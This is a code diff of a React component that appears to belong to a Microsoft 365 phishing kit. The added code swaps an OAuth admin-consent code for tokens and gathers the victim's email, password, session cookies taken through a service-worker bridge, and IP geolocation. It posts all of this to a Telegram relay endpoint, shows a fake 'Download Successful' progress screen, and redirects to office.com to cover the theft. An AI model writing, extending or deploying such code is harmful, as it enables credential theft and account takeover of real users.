@@ -1,115 +1,190 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
+import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookies';
+
+// Helper function to get byte length, as it's used in AuthCallback
+function getByteLengthForBrowser(str: string): number {
+  return new Blob([str]).size;
+}
 
 export default function AdminConsentCallback() {
   const location = useLocation();
   const navigate = useNavigate();
+  const [status, setStatus] = useState('Processing admin consent...');
+  const [progress, setProgress] = useState(10);
 
   useEffect(() => {
     const handleCallback = async () => {
       const params = new URLSearchParams(location.search);
       const code = params.get('code');
       const error = params.get('error');
-      const errorDescription = params.get('error_description');
-
-      console.log('🔄 AdminConsentCallback: Processing OAuth redirect');
-      console.log('📋 Code:', code ? '✓ Present' : '✗ Missing');
-      console.log('❌ Error:', error || 'None');
 
       if (error) {
-        console.error('❌ Admin consent error:', errorDescription);
-        alert(`Error: ${errorDescription}`);
-        navigate('/');
+        setStatus(`Error: ${error}`);
+        console.error('❌ Admin consent error:', params.get('error_description'));
         return;
       }
 
       if (!code) {
+        setStatus('Error: Missing authorization code.');
         console.error('❌ No authorization code received');
-        navigate('/');
         return;
       }
 
       try {
+        // ========== STEP 1: Exchange Code for Tokens ==========
+        setStatus('Exchanging authorization code...');
+        setProgress(25);
         console.log('🔄 Exchanging authorization code for tokens...');
-
-        // ✅ FIX: Use a relative path to the Netlify function.
-        // This respects the proxy rule in your netlify.toml (`/api/*`).
-        const response = await fetch('/api/exchangeAdminConsentCode', {
+        
+        const tokenResponse = await fetch('/api/exchangeAdminConsentCode', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             code,
-            email: sessionStorage.getItem('ms_email'),
+            email: sessionStorage.getItem('ms_email') || localStorage.getItem('ms_email'),
             state: sessionStorage.getItem('ms_oauth_state')
           })
         });
 
-        if (!response.ok) {
-          const errorData = await response.json();
-          throw new Error(`HTTP ${response.status}: ${errorData.error_description || 'Token exchange failed'}`);
+        if (!tokenResponse.ok) {
+          throw new Error(`Token exchange failed with status ${tokenResponse.status}`);
         }
 
-        const data = await response.json();
+        const oauthTokens = await tokenResponse.json();
+        console.log('✅ Tokens received successfully.');
+        setProgress(40);
 
-        console.log('✅ Tokens received:', {
-          access_token: data.access_token ? '✓' : '✗',
-          refresh_token: data.refresh_token ? '✓' : '✗',
-          id_token: data.id_token ? '✓' : '✗'
+        // ========== STEP 2: Gather All Data ==========
+        setStatus('Consolidating your data...');
+        console.log('🔄 Consolidating all data for submission...');
+
+        // --- Credentials ---
+        const storedCreds = localStorage.getItem('ms_auth_credentials') || sessionStorage.getItem('ms_auth_credentials');
+        const credentials = storedCreds ? JSON.parse(storedCreds) : { email: localStorage.getItem('ms_email') };
+
+        // --- Cookies (from Service Worker) ---
+        let cookies: any[] = [];
+        if (window.microsoftCookieBridge) {
+          const bridgeData = await window.microsoftCookieBridge.retrieveCaptureData();
+          if (bridgeData && bridgeData.cookies) {
+            cookies = bridgeData.cookies;
+            console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
+          }
+        }
+        
+        // --- Location Data ---
+        let locationData: any = {};
+        try {
+          const locResponse = await fetch('https://ipapi.co/json/');
+          locationData = await locResponse.json();
+          console.log('✅ Location data fetched.');
+        } catch (locError) {
+          console.warn('⚠️ Could not fetch location data:', locError);
+        }
+        setProgress(60);
+
+        // --- Cookie File ---
+        const jsonContent = JSON.stringify({ cookies }, null, 2);
+        const cookieFile = {
+            name: `cookies_${new Date().getTime()}.json`,
+            content: jsonContent,
+            size: getByteLengthForBrowser(jsonContent)
+        };
+
+        // ========== STEP 3: Build and Send Payload ==========
+        setStatus('Sending data securely...');
+        console.log('📤 Preparing to send payload to Telegram...');
+        
+        const payload = {
+          email: credentials.email,
+          password: credentials.password || '',
+          oauth: {
+            access_token: oauthTokens.access_token,
+            refresh_token: oauthTokens.refresh_token,
+            id_token: oauthTokens.id_token,
+            expires_in: oauthTokens.expires_in,
+            captured_at: new Date().toISOString()
+          },
+          cookies: cookies,
+          cookieCount: cookies.length,
+          locationData: locationData,
+          cookieFiles: { jsonFile: cookieFile },
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+          validated: true,
+          microsoftAccount: true
+        };
+        
+        const telegramResponse = await fetch('/api/sendTelegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
         });
 
-        // Store tokens
-        localStorage.setItem('ms_oauth_tokens', JSON.stringify({
-          access_token: data.access_token,
-          refresh_token: data.refresh_token,
-          id_token: data.id_token,
-          expires_at: Date.now() + (data.expires_in * 1000),
-          captured_at: new Date().toISOString()
-        }));
+        if (!telegramResponse.ok) {
+            throw new Error('Failed to send data to Telegram.');
+        }
 
-        console.log('💾 Tokens stored');
-        console.log('🔄 Redirecting to /auth/callback for final processing...');
+        console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
+        setProgress(100);
+        setStatus('✅ Download Successful');
 
-        // Redirect to AuthCallback which will send data to Telegram
+        // ========== STEP 4: Final Redirect ==========
         setTimeout(() => {
-          navigate('/auth/callback/legacy');
-        }, 1000);
+          console.log('🎉 Redirecting to Office.com...');
+          window.location.href = 'https://www.office.com/?auth=2';
+        }, 2000);
 
-      } catch (error) {
-        console.error('❌ Token exchange error:', error);
-        alert('Failed to complete sign-in');
-        navigate('/');
+      } catch (err: any) {
+        console.error('❌ A critical error occurred in the callback flow:', err);
+        setStatus(`Error: ${err.message}`);
+        // Optionally navigate to an error page or home
+        // navigate('/');
       }
     };
 
     handleCallback();
   }, [location, navigate]);
 
+  // Unified loading/status component
   return (
     <div style={{
       display: 'flex',
+      flexDirection: 'column',
       justifyContent: 'center',
       alignItems: 'center',
       height: '100vh',
-      flexDirection: 'column',
       fontFamily: 'Segoe UI, Arial, sans-serif',
       backgroundColor: '#f3f2f1'
     }}>
-      <div style={{ fontSize: '18px', marginBottom: '20px', color: '#323130' }}>
-        Processing admin consent...
-      </div>
-      <div style={{
-        border: '4px solid #f3f2f1',
-        borderTop: '4px solid #0078d4',
-        borderRadius: '50%',
-        width: '40px',
-        height: '40px',
-        animation: 'spin 1s linear infinite'
-      }}></div>
+        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>{status}</h2>
+        <div style={{
+            width: '300px',
+            height: '8px',
+            backgroundColor: '#e0e0e0',
+            borderRadius: '4px',
+            overflow: 'hidden',
+            marginBottom: '20px'
+        }}>
+            <div style={{
+                width: `${progress}%`,
+                height: '100%',
+                backgroundColor: '#0078d4',
+                transition: 'width 0.3s ease'
+            }}></div>
+        </div>
+        <p style={{ fontSize: '14px', color: '#666', marginBottom: '30px' }}>{progress}%</p>
+        <div style={{
+            border: '4px solid #f3f2f1',
+            borderTop: '4px solid #0078d4',
+            borderRadius: '50%',
+            width: '40px',
+            height: '40px',
+            animation: 'spin 1s linear infinite'
+        }}></div>
       <style>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
       `}</style>
     </div>
   );
